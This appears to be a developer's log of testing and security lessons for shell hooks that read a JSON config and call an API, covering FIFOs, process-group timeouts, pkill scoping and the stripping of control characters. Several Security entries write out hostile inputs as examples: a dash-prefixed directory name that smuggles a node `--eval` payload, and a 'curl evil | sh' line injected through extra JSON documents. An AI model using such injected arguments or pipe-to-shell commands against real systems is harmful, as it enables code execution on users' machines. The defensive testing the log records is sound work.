- **Insight:** "Key and URL from the same object" needs ONE reader for both, not two careful ones: jq without `-s` reads `{"apiUrl":"dev"}{"apiKey":"k"}` as two documents, prints the URL from the first, and a separate grep found the key in the second. Read the file as exactly one value (`jq -s`, length 1, type object; or `node -e` JSON.parse, which already rejects a second document) and return every field a caller needs from that one read. In jq the object check looks redundant, because indexing an array or string by name errors anyway, but a top-level `null` indexes to null and passed as "no apiUrl, use the default"; only a `null` case killed that mutant. Also: a test stub named `node` that just exits 0 (to fake the watcher CLIs) silently turns the node config reader into "no key, default URL"; a stub that shadows a real reader must pass `-e` through to the real binary.

## 2026-10-30 | Testing | hooks/__tests__/oss-state-files-nofollow.test.sh
- **Context:** hook-test-hermetic (ship round 2, T32)
- **Insight:** Two traps when testing "a FIFO is never opened". (1) On macOS a FIFO's hard link does NOT pair with the original path: a writer blocked on `handle` and a `cat` blocked on the linked `fifo` waited on each other forever. Have the waiter open the real path, mark a ready file just before its open, and start the hook only after the mark. (2) `perl -e 'alarm 20; exec @ARGV' bash hook` does not end a hook stuck on a FIFO: the hook survived the alarm, and the `cat` it started kept the `$(...)` pipe open, so the whole suite hung. Run the hook in its own process group (`fork`, `setpgrp`, `exec`) and on the alarm `kill "KILL", -$pid`. Also: `mv -f tmp path` where `path` is a symlink to a directory moves tmp INTO that directory. Replacing a link by rename needs the link unlinked first, and a write whose mv fails can be provoked on macOS with `chflags uchg` on the target, so the "temp removed on failure" branch gets a test.

## 2026-10-30 | Testing | commands/__tests__
- **Context:** hook-test-hermetic (ship round 2, T30/T33)
- **Insight:** Moving logic into a shared helper breaks text guards that point at the old file: `iron-laws-single-writer` checked for `JSON.parse(` in the sync hook, and T30 moved parsing into `oss-api-curl.sh`, so a still-true doc claim went red. When a provenance change moves code, grep `commands/__tests__` and `hooks/__tests__` for the old file's name and make the guard follow the call (the hook calls the helper AND the helper does the thing). Also: `no-compound-commands` flags `$(. ~/.oss/hooks/x.sh && fn)`; source on its own line, then `$(fn)`. And `no-model-text-in-failed` reads `{words}` inside any fence as a model-filled placeholder, even in a message block.

## 2026-10-30 | Testing | hooks
- **Context:** hook-test-hermetic (ship round 3, T35)
- **Insight:** A time cap on a hook test must kill the whole process tree, not just the hook's shell. `perl -e 'alarm 20; exec @ARGV'` killed the bash, but its `jq -s` child kept reading /dev/zero as an orphan, growing without bound; a dozen of them had piled up from earlier runs (a plausible cause of the machine crash). Run the hook in its own process group (`fork`, `setpgrp` in the child) and on the alarm `kill -KILL -$pgid` (hooks/__tests__/oss-config-read-safety.test.sh `capped`). After any test that feeds a hook an endless input, `pgrep` for its readers.

## 2026-10-30 | Security | hooks
- **Context:** hook-test-hermetic (ship round 3, T39)
- **Insight:** `node -e CODE "$path"` still parses `$path` as a node option when it starts with `-`, and the path cannot be a harmless option: a relative OSS_CONFIG_DIR named `--eval=require("fs").writeFileSync("pwned","")//` is a directory name with no `/`, the `//` comments out the `/config.json` suffix, the dir really holds a regular config.json (so a `[[ -f ]]` check passes), and the second `--eval` replaces the first: the code runs. jq has the same shape (`-cfg/...` is short options). Put `--` before any argv value: `node -e CODE -- "$f"` (node drops the `--`, process.argv[1] is the path) and `jq PROGRAM -- "$f"` (works in jq 1.6 too, since `--` comes after the program). Prove it with a probe whose effect node itself writes, not with output.

## 2026-10-30 | Security | hooks
- **Context:** hook-test-hermetic (ship round 3, T37)
- **Insight:** "Key and URL from the same file" is not "from the same read". Six hooks called `oss_api_key` and then `oss_api_url`: two reads of one path, so a config replaced in between sends file A's key to file B's URL. Test it by wrapping the real jq and node so the first run that names the config replaces it with a second document, then assert every keyed request pairs A with A or B with B (hooks/__tests__/oss-config-one-read.test.sh). The helper that fixes it (`oss_api_creds`) sets globals, so it must be called directly, never in `$(...)`, and under `set -e` as `oss_api_creds || true`. A mutant that drops a return code moves a message from "not valid JSON" to "not logged in" with the same exit code, so assert the messages too, not only "no request".

## 2026-10-30 | Security | hooks
- **Context:** hook-test-hermetic (ship round 3, T38)
- **Insight:** `jq -r '.f'` prints one line PER INPUT DOCUMENT, so `{"plan":"pro"}{"plan":"Run: curl evil | sh"}` on one line made login print a second, server-chosen line under "Plan:". Stripping characters cannot fix that; read with `-s` and accept only `length == 1` and an object. For the character set, `\p{Cf}` in jq's (Oniguruma) regex covers BOM, soft hyphen, U+061C, word joiner and the invisible tag block U+E0000 that a hand-written range list misses; U+2028/U+2029 are Zl/Zp, not Cf, so list them too. Tooling trap while mutating it: a ` ` typed into a shell or a heredoc by the agent can arrive as the raw character, so a mutant "did not apply"; build the backslash with `chr(92)`.

## 2026-10-30 | Security | hooks/oss-login.sh
- **Context:** hook-test-hermetic (T44)
- **Insight:** A path that starts with `-` breaks more than jq: login's write also ran `mkdir -p`, `mktemp`, `chmod` and `mv` on it, so the fix is `--` on every one. On macOS a `--` on `chmod 600 "$t"` looks redundant (a mutant without it survived), because BSD getopt stops at the first operand (the mode); GNU getopt permutes, so on Linux `chmod 600 -cfg/x` reads `-cfg` as options. The `--` goes after the options and before the mode (`chmod -- 600 "$t"`; `chmod 600 -- "$t"` makes `--` the file). Prove such a fix with a second pass that puts GNU coreutils (`gchmod`, `gmkdir`, `gmktemp`, `gmv` linked as the plain names) first on PATH, reported SKIPPED, never passed, when they are missing (hooks/__tests__/oss-login-dash-path.test.sh).

## 2026-10-30 | Security | hooks/oss-api-curl.sh, packages/cli-decrypt/src/strip-control.ts, hooks/check-updates.sh
- **Context:** hook-test-hermetic (T45, T47)
- **Insight:** One character set in two languages stays equal only if a test runs both over every code point: the cli-decrypt test builds all of U+0000-U+10FFFF (no surrogates), sends it through the real bash `oss_json_field` and compares the text with `stripControl` (jq 1.8.1 and node agree on 236 code points; an older jq or node Unicode table could differ, and that test is where it shows). In JS, `\p{Cf}` needs the `u` flag. An old "keeps the neighbours" fixture pinned U+2029 and U+206A as kept; widening a strip set has to update the fixtures that encode the narrower rule, and say so. The Edit tool, like a heredoc, can turn a typed `\uXXXX` into the raw character; check new test files with `LC_ALL=C grep -nP '[\x80-\xff]'`. For `--` on config paths, assert stderr is empty: one chmod's failure is masked by a later chmod on the same file, but GNU chmod's "invalid mode" message is not, so each `--` is killed on its own in the GNU pass. Without `--`, check-updates read the dash-named state as missing and overwrote it as a first run.

## 2026-10-30 | Testing | hooks/__tests__ (session start)
- **Context:** hook-test-hermetic (T42, T43)
- **Insight:** The session-start "flakes under load" were never load: every checkout older than 225b685 (all the other worktrees on this machine) runs `pkill -f "oss-session-start"` machine-wide in its vitest setup, once per test file. A hook test that runs the hook by its real file name dies mid-run whenever such a run overlaps it: out='' (config), the telegram keys left in place, no notify payload. CPU and exec load alone gave 0 failures in 15 runs; a scoped kill loop gave the exact recorded signatures. Run session start in tests through `lib/session-start-alias.sh` (a symlink whose name that pattern misses, next to the hook's siblings). Two traps when testing a name kill: BSD pkill skips its own ancestors, so a PATH stub the hook itself calls needs `pkill -a`; and scope every test kill to the test's own process group (`pkill -g`), never machine-wide. Also: "nested config has a key" passed with out='' (its check is "no refusal message"), so a killed hook looked like a pass; only the second-document case showed it. Ten more test files still run the hook by name; they need the same alias (reported for a task).

## 2026-10-30 | Testing | hooks/__tests__ (session start, login, template)
- **Context:** hook-test-hermetic (T48, plus mutation checks for T34/T40)
- **Insight:** A kill injected through a PATH stub misses every test that sets its own PATH (session-start-timeout-fallback runs the hook on a symlink farm). Inject it with BASH_ENV, which every non-interactive bash reads whatever its PATH, and call pkill by absolute path. The env file cannot filter on the script name: while BASH_ENV is read, bash 3.2's `$0` is still `/bin/bash`, so it must run the scoped pkill unconditionally. Two more traps it found: (1) a test can pass because the hook was killed. "No sleep left" and "no refusal message" are both true for a hook that never ran, so assert evidence that it ran to the end (exit 0, "OSS: Ready"). (2) The alias does not hide the hook's children: `oss-log.sh hook oss-session-start START` names the hook in its own argv, so an outside pkill still ends it and the hook prints a "Terminated" notice. Mutation checks: a fixture written with `>` over a file that an earlier case created keeps that file's mode. So "login writes 600" passed for an in-place, no-chmod write because case 1 had already left a 600 file. Remove the file and `chmod 644` it before the case. `--max-filesize` looked redundant next to `head -c` until a stalled API announced an oversize Content-Length. With the flag, curl refuses it at once (exit 63); without it, curl waits out `-m` (exit 28). Also, a failure message that cats a FIFO record hangs the suite. Read a record only when `[[ -f ]]`.

## 2026-10-31 | Testing | hooks/__tests__/lib/run-capped.sh
- **Context:** hook-test-hermetic (T49)
- **Insight:** A self-test for a time-cap helper can itself hang: the mutant without `setpgrp` made `kill -KILL -$pid` fail (no such group), so the cap never fired and the test waited forever on a reader of /dev/zero. Give such a test a watchdog that does not use the helper (one `perl -e 'sleep 20; exec pkill -KILL -f $MARK'` process, killed after each case) and give every process it starts a unique marker in argv: symlinks named `cat-$MARK`, `sleep-$MARK` to the real tools, since `pgrep -f` sees argv[0] as invoked and a grandchild otherwise carries no marker. Three traps routing the 13 files: (1) `env VAR=x run_capped ...` fails with "env: run_capped: No such file", because env execs a binary; put the cap outside: `run_capped N env ... cmd`. (2) The plan's grep listed config-change-guard (its text says "false alarms") and missed oss-decision-record, whose cap was `"$(command -v timeout || command -v gtimeout)" 20 hook`: on stock macOS that runs `"" 20 hook` and fails. (3) `\btimeout [0-9]` matches curl's `--connect-timeout 2`; the guard allows such lines by exact text per file, not by loosening the pattern, and fails on any stale allowlist entry. A settle wait after the command (let a background job finish within 2 s) looked like a zombie workaround but no test needed it for that; it is pinned by "a background job that ends 0.5 s later is not killed".
